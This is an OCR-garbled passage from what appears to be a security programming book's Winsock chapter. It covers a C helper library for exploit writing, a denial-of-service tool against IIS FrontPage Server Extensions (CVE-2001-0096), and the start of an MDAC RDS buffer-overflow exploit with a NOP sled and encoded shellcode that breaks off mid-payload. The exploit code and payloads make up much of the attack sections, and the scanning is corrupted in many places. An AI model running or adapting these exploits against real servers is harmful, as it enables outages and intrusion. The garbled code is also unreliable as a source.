if [WSAStartuplwVersionRequested, SwsaDatal < 0) 
39 
t 
40 
p r i n t f ("tt####tt###tf#ttERROR!tt###############(t##tt\n") ; 
4 1 
p r i n t f ( " Y o u r ws2_32,dll i s too old t o use t h i s a p p l i c a t i o n , 
\ n " ) ; 
42 
printfC'Go to m i c r o s o f t s web s i t e to download t h e most r e c e n t \ n " ) ; 
4 3 
p r i n t f ( " v e r s i o n o f w s 2 _ 3 2 . d l l . 
\ n " l ; 
44 
45 
WSACleanupl); 
46 
r e t u r n 
(FALSE); 
47 
} 
48 
MySock = Socket (AF_INET, SOCK_5TREAM, 0 ) ; 
49 
if(MySock==INVALID_SOCKET) 
50 
{ 
51 
printf("Socket errorI\r\n"); 
52 
closesocket(MySock); 
53 
WSACleanupl); 
54 
return (FALSE); 
55 
i 
56 
if ({pTarget = gethostbyname(targetip)} == NULL) 
57 
( 
58 
printf{"\nResolve of %s failed, please try again.\n"„ targetipJ; 
59 
60 
closesocket(MySock); 

Windows Sockets (Winsock) • Chapter 4 
163 
61 
62 
63 
64 
65 
6 6 
soc] 
67 
68 
69 
70 
71 
12 
73 
74 
75 
76 
77 
78 
79 
80 
) 
} 
WSACleatiup [) ; 
r e t u r n 
(FALSE)j 
memcpy (&sock.sin_addr ,s_addr, 
pTarget->h_addr, 
pTarget->h_length) ; 
sock ,sin_family = AF_INET; 
( . s i n _ p o r t = htons{(USHORT)port); 
i f 
( 
{ 
) 
e l s e 
• : 
} 
(connect(MySock, 
( s t r u c t sockaddr *)&sock, 
s i z e o f 
(sock) 
))) 
closesocket(MySock)j 
WSACleanupU ; 
r e t u r n 
(FALSE); 
closesocket(MySock); 
WSACleanupU ; 
r e t u r n 
(TRUE); 
81 
bool is s t r i n g i n ( c h a r *needle, 
char *haystack) 
82 
t 
83 
84 
85 
86 
87 
88 
89 
90 
91 
92 
) 
char 
m 
I 
> 
e l s e 
{ 
] 
*loc = s t r s t r ( h a y s t a c k , n e e d l e ) ; 
Loc != MULL ) 
return(TRUE); 
return(FALSE); 
93 
char 
* r e p l a c e _ s t r i n g ( c h a r *new_str, 
char * o l d _ s t r , 
char *whole_str) 
94 < 
95 
96 
97 
9S 
99 
100 
101 
102 
103 
104 
105 
106 } 
i n t 
char 
char 
Len = s t r l e n ( o l d _ s t r ) ; 
bufferlMAX] 
= "•; 
*loc 
• s t r s t r ( w h o l e _ s t r H 
o l d _ s t r ) ; 
i f ( l o c != NULL) 
{ 
> 
s t r n c p y ( b u f f e r , 
w h o l e _ s t r r 
l o c - w h o l e _ s t r 
) ; 
s t r e a t ( b u f f e r , 
n e w _ s t r ) ; 
s t r c a t ( b u f f e r , 
loc -t- ( s t r l e n ( o l d _ s t r ) ) ) ; 
s t r c p y ( w h o l e _ s t r r 
b u f f e r ) ; 
r e t u r n 
w h o l e _ s t r ; 
107 char 
* s e n d _ e x p l o i t ( c h a r 
* t a r g e t i p , 
i n t p o r t , 
char 
*send s t r i n g ) 
108 { 
109WSADATA wsaData; 
110 
111 
112 
113 
114 
115 
116 
117 
118 
WORD wVe r s i on Regues t ed j 
s t r u c t h o s t e n t 
t a r g e t _ p t r ; 
s t r u c t sockaddr_in 
sock; 
SOCKET MySock; 
wVersionRec[uested = MAKEWORD(2, 2 ) ; 
if 
(wSAStartup(wversionRequested, 
SwsaData) 
!= 0) 
{ 
printf("##*#*######*#** ERROR! tt##tt##*#t)tt##*#*##*##*#\n-) ; 
p r i n t f ( " Y o u r ws2_32.dll i s too old t o use t h i s a p p l i c a t i o n 

164 
Chapter 4 • Windows 5ockets (Winsock) 
119 
printf("Go to microsofts Web site to download the most recent \n"); 
120 
printf ("version of ws2_32.dll, 
\n"), 
121 
WSACleanupU; 
122 
exit (1) ; 
123 
} 
124 
MySoek = socket (AF_INET, SOCK_STREAM, 0); 
125 
if(MySock==INVALID_SOCKETt 
126 
{ 
127 
printf("Socket error!\r\nB)j 
128 
129 
closesocket(MySoek); 
130 
WSACleanupU; 
131 
e x i t ( l ) ; 
132 
} 
133 
if ( {pTarget • get host byname (target ip) ) == HULL) 
134 < 
135 
printf("Resolve of %s failed, please try again.\n", targetip}; 
136 
137 
closesocket(MySoek); 
138 
WSACleanupU ; 
139 
e x i t ( l ) ; 
140 
} 
141 
momcpy (ksock. sin_addr ,s_addr, pTarget->h_ado"r, pTarget->h_length} ; 
142 
sock,sin_family = AF_INET; 
143 
sock,sin_port = htons((USHORT)port); 
144 
145 
if ( (connect(MySoek, 
(struct sockaddr M&sock, sizeof (sock) })) 
146 
{ 
147 
printf("Couldn't connect to host,\n") ; 
148 
149 
closesocket (MySoek) ; 
150 
WSACleanupU ; 
151 
exit (1) ; 
152 
J 
153 
char sendfile[STRING_MAX]; 
154 st rcpy (sendfile, send_5tring) ,r 
155 
if (send (MySoek, sendfile, sizeof (sendfile) - 1 , 0) == -1) 
156 
{ 
1 57 
printf("Error sending Patket\r\n"); 
1 58 
closesocket(MySoek); 
159 
exit (1) ; 
160 
} 
161 
1 62 
send(MySock, sendfile, sizeof(sendfile)-1, 0); 
163 
ch^r *recvString = new char [MAX] „-
164 
int nret; 
165 
nret = recv(MySoek, recvString, MAX + 1, 0} ; 
166 
char *output= new charLnret]; 
167 
strcpy(output, "") ; 
168 
if (nret == S0CKET_ERROR) 
169 
{ 
170 
printf ("Attempt to receive data FAILED. \n"),-
171 
} 
172 
else 
173 
{ 
174 
strneat(output, recvString, nret); 
175 
delete [ J recvString; 
176 
} 

Windows Sockets (Winsock) • Chapter 4 
165 
1 77 
closesocket(MySock); 
1 7 8 
WSACleanupO ; 
179 
r e t u r n 
( o u t p u t ) ; 
180 
d e l e t e [ ] o u t p u t ; 
181 } 
1 8 2 char 
* g e t _ h t t p ( c h a r * t a r g e t i p r 
i n t p o r t , 
char *file) 
183 { 
184wSADATA wsaDatar 
185 
WORD wVersionRequested; 
1 8 6 
s t r u c t h o s t e n t 
t a r g e t _ p t r ; 
1 8 7 
s t r u c t sockaddr_in 
sock; 
1 8 8 
SOCKET MySock; 
189 
190 
wVersionRequested = MAKEWORD(2, 2); 
191 
if (WSAStartupfwVersionRequested, &wsaData) < 0) 
192 
{ 
193 
printfl"#####*#####*##### ERROR! ###################\n"); 
1 9 4 
p r i n t f l " Y o u r ws2_32.dll i s too old t o use t h i s a p p l i c a t i o n . 
\ n - ) ; 
1 9 5 
p r i n t f ( " G o to m i c r o s o f t s Web s i t e to download t h e most r e c e n t \ n " ) ; 
1 9 6 
p r i n t f l "version of w s 2 _ 3 2 . d l l . 
\n"l 
1 9 7 
1 9 8 
WSACleanup () ; 
1 9 9 
e x i t l l ) ; 
2 0 0 
} 
2 0 1 
MySock = SOCket (AF_INET, SOCK_STREAM, 
0 ) ; 
2 0 2 
if <MySock==INVALID_SOCKET) 
2 0 3 
{ 
2 0 4 
p r i n t f ("Socket 
e r r o r ! \ r \ n " ) ; 
2 0 5 
206 
closesocket(MySock}; 
2 0 7 
WSACleanupO ; 
2 0 8 
e x i t ( l ) ; 
2 0 9 
) 
210 
if ( (pxarget = gethostbyname(targetipl ) == N U L L ) 
211 
{ 
212 
printf("Resolve of %s failed, please try again,\n"H targetip); 
213 
2 1 4 
c l o s e s o c k e t (MySock) ; 
2 1 5 
WSACleanupO j 
2 1 6 
e x i t ( 1 ) ; 
217 
} 
218 
memcpy(&sock.sin_addr Ts_addr, 
pTarget->h_addr, 
p T a r g e t - > h _ l e n g t h ) ; 
2 1 9 
sock.sin_£ajmily = AF_1NET; 
2 2 0 
s o c k . s i n j p o r t = htons((USHORT)port); 
221 
2 2 2 
if 
( 
(connect(MySock, 
( s t r u c t sockaddr *)&sock, 
s i z e o f 
(sock) 
))) 
223 
{ 
224 
printf("CouldnH t connect to host.\n*); 
225 
226 
closesocket(MySock}; 
2 2 7 
WSACleanupO ; 
2 2 8 
e x i t ( l ) ; 
229 
) 
2 3 0 
char sendfile[STRING_MAX] ; 
2 3 1 
s t r c p y (sendfile, 
•GST • ) ; 
2 3 2 
s t r c a t (sendfile, file) ; 
2 3 3 
s t r c a t ( s e n d f i l e , 
" HTTP/1.1 \ r \ n " 
); 
2 3 4 
s t r c a t ( s e n d f i l e , 
"Host: 
l o c a l h o s t \ r \ n \ r \ n " ) ; 

166 
Chapter 4 • Windows 5ockets (Winsock) 
235 
if IsendtMySock, sendfile, sizeof (sendfile) - 1 , 0) == -1) 
236 
{ 
237 
printf("Error sending Packet\r\n"); 
238 
closesocket(MySock); 
239 
WSACleanupO ; 
240 
exit (1) ; 
241 
} 
242 
send(MySock, sendfile, sizeof(sendfile)-1, 0); 
243 
244 
char *recvString • new char[MAX]; 
245 
int nret; 
246 
nret = recv(MySock, recvString, MAX + 1, 0) ; 
247 
248 
char *output= new chartnret]; 
249 
strcpy[output, •"•}; 
250 
if (nret == S0CKET_ERROR> 
251 
< 
252 
printf("Attempt to receive data FAILED. \n"); 
253 
} 
254 
else 
255 
( 
256 
s t m e a t (output, recvString, nret) ; 
257 
delete [ ] recvString; 
258 
} 
259 
closesocket (MySock) ; 
260 
WSACleanupO ; 
261 
262 
return {output); 
263 
delete [ ] output; 
264 } 
265 char *banner_grab(char *targetip, int port) 
266 { 
267 
char start_banner [ ] = " Server: M ; 
268 
char end_banner[]= "\n"; 
269 
int start = 0; 
270 
int end = 0; 
271 
char* ret_banner • new charfMAX]; 
272 
char* buffer = get_http(targetip, port, 
"/")j 
273 
274 
int len = strlen(buffer); 
275 
276 
char *pt = strstr(buffer, start_banner ); 
277 
278 
if( pt != HULL ) 
279 
{ 
280 
s t a r t = pt - buffer; 
281 
forlint x = s t a r t ; x < len; x-t-O 
282 
{ 
283 
if(_strnicmp( buffer + K, end_banner, 1 ) == 0} 
284 
{ 
285 
end = x; 
286 
x = len; 
287 
} 
288 
} 
289 
strcpy (ret_banner, • " ) ; 
290 
strncat (ret_banner, buffer + s t a r t - 1 , 
(end - start) ) ; 
291 
} 
292 
else 

Windows Sockets (Winsock) • Chapter 4 
167 
293 
{ 
294 
strcpy(ret_banner, "EOF") ; 
295 
} 
296 
return 
(ret_banner); 
297 
delete [ ] retjbanner; 
298 > 
Analysis 
• 
At lines 5 through 28, a junkQ function is imperative. If you have ever written 
exploit code, you will inevitably find yourself writing a few loops to generate a 
long string of the same characters, or even random characters. This is why you 
need ajttukQ function of some kind. The junkQ function takes two arguments, 
a string and the number of times to repeat that string, and returns a long junk 
string. Though simple, having a junk function can save you a lot of time when 
writing exploit code, especially ones that exploit buffer overflows and file 
traversal flaws. 
• 
At lines 29 through 79, the is_up() function is another very useful function to 
have readily available. This is perhaps the most simple of all socket programs. Its 
purpose is to attempt to connect to a machine on a particular port. If it receives 
an error when trying to connect, it means the port is down or non-responsive 
and the function returns a FALSE. If it can connect to the port, it is an indica-
tion that the port is up and probably working properly. This function is especially 
useful when you need to send exploit code to a number of ports and/or a 
number of IP addresses. By making sure that the port is open before sending the 
exploit code, your program will execute faster and use less bandwidth by not 
attempting to exploit ports that are not open.This is also useful for testing to see 
if a denial of service (DOS) exploit successfully brought down a service. 
However, keep in mind that just because a system is still successfully making 
connections does not guarantee that the service is still working. It is possible for 
a service to take connections and still be in a DOS state. 
• 
Lines 80 through 91 are the is_string_in() function.The is_striiig_in() function 
takes two strings and checks to see if the first can be found inside the second 
string. This is especially useful when you get a banner or Web page back and 
want to check for specific key words. 
• 
Lines 92 through 106 are the rep!aa'_striiig() function. The repl(icc_stnn^() func-
tion takes in three strings.The whole_str string is the message you want to edit, 
the old_str string is the string you want to replace, and the new_str string is 
what you want to replace the o!d_str string with, 
• 
Lines 107 through 181 are for the set td_explo it() fu nc ti o n. T h e sen d_cxp to it () 
function is probably the most useful when writing non-complex exploits that 
do not need to make a continuous stream of assaults on the same connection. 
It makes an easy delivery device to send an exploit and check the response 
after words.The send exploit takes in three arguments: a string for the IP 

168 
Chapter 4 • Windows Sockets (Winsock) 
address, an integer for the port number, and a string that normally contains the 
exploit string. 
• 
Lines 182 through 264 make up rhe get_http() function. This function takes 
three arguments for the IP address, the port to connect to, and the file you will 
use to retrieve. 
• 
At lines 265 through 298 are the ihvmur_gmb() function.This function takes 
two arguments: for the IP address and the port to connect to. Assuming it is 
Web server service, this function will return the servers banner string. 
Last but not least is the maiiiQ function.Yon need a main function when writing any 
exploit or vulnerability check.The vulnerability checking and exploit programs are very 
similar, so having a standard main template is valuable.This function will not go into 
your hack,!) file. Instead, you can call it cmptty.cpp. This function will take in the input 
provided by the user, in this case, always an IP or a Web address and possibly a port.The 
maitt() function has all the functionality needed to grab user input and prompt them if 
they have not entered the proper input values. Keep in mind that these values will vary 
depending on the nature of the exploit or vulnerability check (see Example 4,6). 
£ V N ( f L £ & £ Exa 
1 
2 
3 
4 
S 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
IS 
19 
20 
imple 4.6 Generic Main Function 
tincluae <st<3io.h> 
int maintint argc, char *argv[ ]) 
( 
int port = BO; 
char* targetip; 
char* output = NULL; 
if (argc < 2) 
t 
printf("XXXXXXX usage;\r\n"); 
printEf" 
%s <TargetIP>\r\n", argv[0J) 
return(O); 
} 
targetip = argv(l]; 
if (argc >= 3) 
{ 
port = atoi(argv[2]}; 
) 
/ / E x p l o i t / I I I 
III 
III 
I1111 
III 
II1111lllllll1 
} 
Analysis 
At line 3, the default port is port 80. 
Lines 6 through 11 are intended to return a usage, if no arguments are pro-
vided. 
Lines 14 through 17 provide a means for a user to specify a porr number; if 
none is given, the application will default to port 80. 

Windows Sockets (Winsock) * Chapter 4 
169 
Summary 
The WinSock 2 AIM uses ws2_32.dll to communicate to the Winsock SIM. The SIM is 
used by the actual hardware appliance. The beauty of the Winsock AIM is that it gives 
the programmer maximum control over what is sent to and from the appliance without 
his or her having to know what the actual appliance is. 
The majority of the socket program is preparing a connection to take place and 
then going through error checking at each point. The actual sending and receiving of 
data is not difficult. Most large-scale projects require a great deal of error checking and 
error handling to prevent an error from shutting down the entire program. If you go 
back over Example 4.5 and modify the MAX or STRING_M^X to a relatively small 
number (such as 10), and then send a large message, you will see how easy it is to crash 
the programs that we have created using a buffer overflow. 
Infrequent overflows that crash the program might seem like minor glitches. 
However, in large-scale operations, these little glitches are the source of vulnerabilities 
that become server exploits. The Winsock AIM is an excellent tool for writing exploits 
and vulnerability checks. As you explore exploit code available online, you will discover 
a great deal of it that uses Winsock 2. Moreover, when you examine exploit programs 
written for UNIX and Linux, you will see how similar the code is to exploit code that 
uses Winsock 2. UNIX and Linux code can be ported over to Winsock 2 without 
needing to change or add too much to the original code. 
Solutions Fast Track 
Winsock Overview 
0 
Winsock was released in January 1993, and has two DLLs associated with it. 
0 
Depending on whether or not it is being used to write a 16-bit or a 32-bit 
application, the wwsock.dll component is used in 16-bit applications and 
wssock32.dll is used in 32-bit applications. 
Winsock 2.0 
0 
One of the first limitations of the original release of Winsock was that it could 
only be used for TCP/IP connections, whereas Winsock 2 is capable of using 
many other types of connection protocols. 
0 Accessing the Winsock library can be done in one of two methods. You can 
either directly link to the DLLs via a Microsoft Project file, or from within the 
code utilizing an include statement. 
www.syngress.com 

170 
Chapter 4 • Windows Sockets (Winsock) 
Writing Client Applications 
0 Most exploits and vulnerability scanning applications utilize a collection of 
client-programming technologies. These clients connect to remote systems, 
send data, and retrieve responses. 
0 
In general, the core difference between client applications and server 
applications is who sends the initial communication request. In typical 
programming applications, the client initiates communication with server 
applications. 
WritingServer Applications 
0 
Winsock server applications arc nearly identical to the client applications. Both 
send and receive information. The only key difference between the two is how 
the connection is made. The nature of a server is to wait around listening for a 
client to connect. 
Writing Exploit and Vulnerability Checking Programs 
0 
Our hack.ii file can be leveraged outside of this book for use with just about 
any information security program, as it simplifies multiple routines that are 
commonly utilized in exploits, security tools, and quickie programs. 
Links to Sites 
uiinaapplkationdcfertse.com Application Defense has a solid collection of free 
security and programming tools, in addition to all of the code presented 
throughout this book. 
www.soskets.com An excellent site for resources on socket programming to 
include Microsoft's Windows socket programming. 
hup:Ilwww.sockets.comI'winsock2.htm A subset of the overall www.sockets.com 
Web site, this link is directly responsible for providing information on the 
Winsock 2.0 implementation. 
http: I/www.faqs. org/jhqs/windows/winsock-faq/ While some of the freque n11y 
asked questions on this Web site may appear to be outdated, it does house a 
substantial amount of information that can be helpful to beginner and 
intermediate-grade network programmers. 
http://www.ccrbcrns-sys.com /~bcllcis 1/mtti_mss_runn.html Another u se fu 1 reso u rce 
that contains information about how to best implement Winsock. 
www.syngress.com 

Windows Sockets (Winsock) * Chapter 4 
171 
Frequently Asked Questions 
The following Frequently Asked Questions, answered by the authors of this book, 
are designed to both measure your understanding of the concepts presented in 
this chapter and to assist you with real-life implementation of these concepts. To 
have your questions about this chapter answered by the author, browse to 
www.syngress.com/solutions and click on the "Ask the Author" form. You will 
also gain access to thousands of other FAQsatlTFAQnet.com. 
Ql Why should I use Winsock over BSD Sockets? 
A: Winsock is the networking API developed by Microsoft and is available on all 
current versions of Windows as well as some Microsoft legacy software. Winsock 
is based on BSD sockets and is nearly identical, with most of the same functions 
and calls. Winsock is available and ready to use on Microsoft's Visual Studio 
C++, which is the most popular compiler for developing programs for Windows 
platforms. 
Q: Are there any tools to troubleshoot applications? 
A: Yes. Network-probing tools are commonly used to troubleshoot network appli-
cations.The best tool to use to probe a server and test client applications is nctcat, 
which is free open source software. Netcat can make simple connections to 
servers and permit the user test various strings. Netcat can also run as a server 
listening for connection. (Itttp://www.atstake .com/research/tools/network_utilities/) 
Q: Are sniffers a useful tool to a socket application developer? 
A: Yes. Sniffers are frequently used for troubleshooting network applications. 
Ethereal is one such sniffer that can be downloaded for free. A sniffer is an 
invaluable tool that a developer can use to examine the packets sent to and from 
a server or client application.The actual packet sent to and from an application is 
more complex and contains more information than is evident in their creation. 
On occasion, extra characters or modified settings may disrupt communication 
between two network applications, which can only be observed while it is in-
transit on the wire. Furthermore, a deliberately malformed packet might lead to 
DOS conditions taking place or worse, a buffer overflow, which can result in a 
security vulnerability. Because a bug in an application may result in the program 
crashing before it can log out or return output to the developer, such events can 
only be observed by a sniffer or other secondary application. (http://ii'wit'.cthe-
real.com/doumtoad.htmi) 

172 
Chapter 4 • Windows Sockets (Winsock) 
A 
Case Study: Using 
WinSock to Execute a Web Attack 
This case study involves a DOS program.This program will exploit a vulnerability that 
exists in Front Page Service Extensions (FPSEs). FPSEs are included in the default instal-
lations of IIS 4.0 and IIS 5.0. When the faulty component within FPSE receives a spe-
cially crafted request, it will fail and bring down the Web server. 
The faulty component can be referenced by its identity "CVE-2001-0096." A patch 
for this vulnerability has been release by Microsoft, so not all IIS 4.0 and IIS 5.0 servers 
will be vulnerable to this exploit. However, the systems that are vulnerable will crash 
upon receiving one or all of the following code lines in a file request: 
"/_vti_bin/shtml . exe/cc-ml .htm" 
"/„vti_bin/shtinl,exe/com2.htm" 
•/_vti_bin/shtml. exe/prn.htm" 
• /_vti_bi.il/shtml. exe/aux. htm" 
The exploit in Example 4.7 will attempt to grab any of the following four fdes in 
order to exploit this flaw. Upon successful exploitation, a vulnerable Web server will 
crash. 
Example 4.7 FrontpageDos Application 
1 fl include <stdio.h> 
2 
^include "hack.h" 
3 
4 
int main tint argc, char *argv(]) 
5 ( 
6 
int port[] = {SO, 81. 443, 7000, 7001, 8000, 8001, 6080, 8888); 
7 
char* targetip; 
8 
9 
if large < 2) 
10 
{ 
11 
printf("frontpageDos.exe usage:\r\n"); 
12 
printf(" 
%s <TargetIP> \rVn", argv[0](; 
13 
return(O); 
14 
) 
' 15 
1 6 
targetip = argv[lj; 
17 
18 
char sendl [ ] - 'h/_vti_binyshtinl .exe/coml^htm"; 
j 19 
char send2 [ ] - 
n /..vti^biLn/shtml .exe/coir^.htrrr; 
20 
char sendS I ] = H /__vti_tairL/shtml .exe/prn.htm"; 
21 
char send4I ] = " ,/_vti__bin/shtml.exe/aux.htm"; 
22 
23 
printf("Starting Attack...\n"); 
24 
25 
f o r d n t x - 0; x < 9; x ++) 
26 
{ 
27 
printf f"Checking port %d: 
m, port[xj); 
28 
if ( is_up(targetip, port [it] ) ) 
www.syngress.com 

•: 
Windows Sockets (Winsock) * Chapter 4 
173 
30 
31 
32 
33 
34 
35 
36 
37 
38 
39 
40 
41 
42 
43 
44 
45 
45 
47 
48 
49 
50 
51 
52 
53 
54 
55 
56 
57 
} 
58 
rreturn(O) ; 
59 ) 
} 
else 
• : 
} 
printf("is up! \n"1; 
p r i n t f f " A t t a c k i n g p o r t %d ", p o r t l x ] ) ; 
get_http(targetip, portlx], sendl); 
get_http(targetip, port[x], send2); 
get_http(targetip, portlx], send3); 
get_http(targetip, portlx]j 
send4); 
SleepUOOOO) ; 
if( !(is_up(targetip, port[Jt))) ) 
{ 
SleepUOOOO) ; 
if ( ! Cis_up(targetip, port [x.) ) ) ) 
( 
printf("Took it down!\n"} 
) 
) 
e I s e 
• : 
printf{"NOT vulnerable. \n"l; 
} 
p r i n t f C i a NOT up. \n"); 
l> 
Analysis 
Line 5 sets the port to the default Web server ports normally found on the 
Internet. 
At lines 32 through 35, the application attempts to grab each of the four vul-
nerable files, which can trigger a DOS condition to take place on the server. 
At line 37, a sleep command is issued. If this exploit is successful, the Web 
server will still take several seconds to crash,The sleep command pauses the 
program to permit this crash to take place before it checks to see if the server 
is still running. 
At lines 39 through 51, the application assesses the server to verify that the ser-
vice went down. This uses a sleep function and makes two checks against the 
attacked server. On occasion, a server may still serve pages as it is crashing and 
may be falsely identified as still operational when in fact the server is just 
moments away from being completely inoperable. 
www.syngress.com 

174 
Chapter 4 • Windows Sockets (Winsock) 
Case Study: Using Winsock 
to Execute a Remote Buffer Overflow 
Microsoft Data Access Components (MDAC) is a collection of" components that provide 
the database access for Windows platforms. One of the components within MDAC, 
Remote Data Services (RDS), enables controlled Internet access to remote data 
resources through Internet Information Services (IIS). Due to incorrect string handling 
within the RDS interface, a malicious user can gain control of the remote system via a 
buffer overrun. Specifically, by sending a specially malformed package to a vulnerable 
system, it is possible to bring the server down and create a DOS situation. Example 4.8 
shows such a package that uses Winsock 2. (Microsoft has released a patch to remedy 
this situation.) 
Example 4.8 MDACDos Application 
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
27 
28 
29 
30 
31 
32 
33 
34 
35 
36 
#include <scdio.h> 
flinclude "hack.ti" 
int mainline argc, char *argv(]) 
( 
int poet[] = [801; 
char* targetip; 
char* output = NULL; 
i f (argc < 2} 
printfCMDAC DoS usage: \r\n-) ; 
printff- 
%s <TargetIP>\r\n-, argv[0)l, 
return(0); 
) 
targetip = argvll]; 
//Exploit//////////////////////////////// 
char * send = 
"POST /msadc/msades.dll/AdvancedDataFactory.Query HTTP/l.l\r\" 
"User-Agent: ACTIV£DATA\r\nHost: blahblah\r\n" 
"Content-Length: 1075\r\n\r\n" 
"ADCClientVersion:01.06\r\nContent-Type: multipart/mixed;boundary= 
'l\x90\x90\x90\x90\x9[)\x90\x9[)\x90\x90\x9O\x90\x90\x9O\x90\x9OVxS'0\x9O" 
"\x90\x90\x90\x90\x90\x90\x9()\x9C\x90\x90\x90\x90\x90\x90\x90\:x:90\x90" 
•\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x30\x90\x90" 
"\x90\x90\x90\x90\xeb\x09\x90\x9G\x90\x90Vx90\x90\x90\x90\x90\x90\x90-
"\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\JC90\X90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
''\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
* N t H 
www.syngress.com 

Windows Sockets (Winsock) * Chapter 4 
175 
37 
38 
39 
40 
41 
42 
43 
44 
45 
46 
47 
48 
49 
50 
51 
52 
53 
54 
55 
56 
57 
58 
59 
60 
61 
62 
63 
64 
65 
66 
67 
68 
69 
70 
71 
72 
73 
74 
75 
76 
77 
78 
79 
80 
81 
82 
83 
84 
85 
86 
87 
88 
89 
90 
•\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
•\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
•\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xcc" 
"\x90\x90\x90\xc7\x05\x20\xf0\xfd\x7£\xd6\x21\x£8\x77\xeb\x03\x5d\xeb" 
"\x05\xe8\xf8\xff\xff\xff\x83\xc5\xl5\x90\x90\x90\x3b\xc5\x33\xc9\x66" 
•\xb9\xd7\x02\x50\x80\x30\x95\x40\xe2\xfa\x2d\x95\x95\x64\xe2\xl4\xad" 
•\xd8\xcf\x05\x95\xel\x96\xdd\x7e\x60\x7d\x95\x95\x95\x95\xc8\xle\x40" 
•\xl4\x7f\x9a\x6b\x6a\x6a\xle\x4d\xle\xe6\xa9\x96\x66\xle\xe3\xed\x96" 
•\x66\xle\xeb\xb5\x96\x6e\xle\xdb\x81\xa6\x78\xc3\xc2\xc4\xle\xaa\x96" 
•\x6e\xle\x67\x2c\x9b\x95\x95\x95\x66\x33\xel\x9d\xcc\xca\xl6\x52\x91" 
"\xd0\x77\x72\xcc\xca\xcb\xle\x58\xle\xd3\xbl\x96\x56\x44\x74\x96\x54" 
•\xa6\xSc\xf3\xle\x9d\xle\xd3\x89\x96\x56\x54\x74\x97\x96\x54\x:Le\x95" 
•\x96\x56\xle\x67\xle\x6b\xle\x45\x2c\x9e\x95\x95\x95\x7d\xel\x94\x95" 
•\x95\xa6\x55\x39\xl0\x55\xe0\x6c\xc7\xc3\x6a\xc2\x41\xcf\xle\x4d\x2c" 
"\x93\x95\x95\x95\x7d\xce\x94\x95\x95\x52\xd2\x£l\x99\x95\x95\x95\x52" 
•\xd2\x£d\x95\x95\x95\x95\x52\xd2\xf9\x94\x95\x95\x95\xf£\x95\xl8\xd2" 
•\x£l\xc5\xl8\xd2\x85\xc5\xl8\xd2\x81\xc5\x6a\xc2\x55\xf£\x95\xlE\xd2" 
•\xfl\xc5\xl8\xd2\x8d\xc5\xl8\xd2\x89\xc5\x6a\xc2\x55\x52\xd2\xb5\xdl" 
•\x95\x95\x95\xl8\xd2\xb5\xc5\x6a\xc2\x51\xle\xd2\x85\xlc\xd2\xc9\xlc" 
•\xd2\xf5\xle\xd2\x89\xlc\xd2\xcd\xl4\xda\xd9\x94\x94\x95\x95\xf3\x52" 
•\xd2\xc5\x95\x95\xl8\xd2\xe5\xc5\xl8\xd2\xb5\xc5\xa6\x55\xc5\xc5\xe5" 
•\x£f\x94\xc5\xc5\x7d\x95\x95\x95\x95\xc8\xl4\x78\xd5\x6b\x6a\x6a\xc0" 
•\xc5\x6a\xc2\x5d\x6a\xe2\x85\x6a\xc2\x71\x6a\xe2\x89\x6a\xc2\x71\xfd" 
•\x95\x91\x95\x95\xff\xd5\x6a\xc2\x45\xle\x7d\xc5\xfd\x94\x94\x95\x95" 
•\xSa\xc2\x7d\xl0\x55\x9a\xl0\x3f\x95\x95\x95\xa6\x55\xc5\xd5\xc5\xd5" 
•\xcS\x6a\xc2\x79\xl6\x6d\x6a\x9a\xll\x02\x95\x95\x95\xle\x4d\xf3\x52" 
•\x92\x97\x95\xf3\xS2\xd2\x97\x8e\xac\xS2\xd2\x91\xea\x9S\x95\x94\xff 
•\xB5\xl8\x92\xc5\xc6\x6a\xc2\x61\xff\xa7\x6a\xc2\x49\xa6\xSc\xc4\xc3" 
•\xc4\xc4\xc4\x6a\xe2\x81\x6a\xc2\x59\xl0\x55\xel\xf5\x05\x05\x05\x05" 
•\xl5\xab\x95\xel\xba\x05\x05\x05\x05\xff\x95\xc3\xfd\x95\x91\x95\x95" 
•\xc0\x6a\xe2\x81\x6a\xc2\x4d\xl0\x55\xel\xd5\x05\x05\x05\x05\xf£\x95" 
"\x6a\xa3\xc0\xc6\x6a\xc2\x6d\xl6\x6d\x6a\xel\xbb\x05\x05\x05\x05\x7e" 
•\x27\x£f\x95\xfd\x95\x91\x95\x95\xc0\xc6\x6a\xc2\x69\xl0\x55\xe9\x8d" 
•\x05\x05\x05\x05\xel\x09\xff\x95\xc3\xc5\xc0\x6a\xe2\x8d\x6a\xc2\x41" 
•\xff\xa7\x6a\xc2\x49\x7e\xlf\xc6\x6a\xc2\x65\xff\x95\x6a\xc2\x75\xa6" 
•\x55\x39\xl0\x55\xe0\x6c\xc4\xc7\xc3\xc6\x6a\x47\xcf\xcc\x3e\x77\x7b" 
•\x56\xd2\xf0\xel\xc5\xe7\xfa\xf6\xd4\xfl\xfl\xe7\xf0\xe6\xe6\x95\xd9" 
•\x£a\x£4\xfl\xd9\xfc\x£7\xe7\xf4\xe7\xec\xd4\x95\xd6\xe7\x£0\x£4\xel" 
•\xf0\xc5\xfc\xe5\xf0\x95\xd2\xf0\xel\xc6\xel\xf4\xe7\xel\xe0\xe5\xdc" 
•\xfb\xE3\xfa\xd4\x95\xd6\xe7\xfO\xf4\xel\xfO\xc5\xe7\xfa\x£6\xf0\xe6" 
